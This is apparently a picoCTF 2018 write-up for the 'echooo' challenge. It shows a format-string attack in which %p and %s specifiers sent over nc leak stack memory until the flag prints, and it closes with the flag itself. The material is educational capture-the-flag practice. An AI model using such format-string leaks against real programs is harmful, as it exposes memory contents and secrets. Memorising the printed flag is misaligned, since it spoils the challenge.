> echooo - Points: 300 - (Solves: 269)
> This program prints any input you give it. Can you leak the flag? Connect with nc 2018shell1.picoctf.com 57169. Source.

Since this is an echo challenge we start off by inputting a bunch of %p and seeing what it returns.

We then try to print everything that looks like an address as a string using %s.

After printing enough arguments we end up printing the flag.
```
nsa@pico-2018-shell-1:~$ nc 2018shell1.picoctf.com 57169
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> %p %p %p %p %p %p
0x40 0xf77655a0 0x8048647 0xf779ca74 0x1 0xf7774490
> %p %s %s %s %p %s
0x40 llllyj@j `Dw 0x1 ii
> %p %p %p %p %p %p %p %p %p %p %p %p
0x40 0xf77655a0 0x8048647 0xf779ca74 0x1 0xf7774490 0xfff92324 0xfff9222c 0x490 0x811b008 0x25207025 0x70252070
> %p %s %s %s %p %s %s %s %p %s
 > picoCTF{foRm4t_stRinGs_aRe_DanGer0us_e3d226b2}
  0x490h$
```

Flag: `picoCTF{foRm4t_stRinGs_aRe_DanGer0us_e3d226b2}`
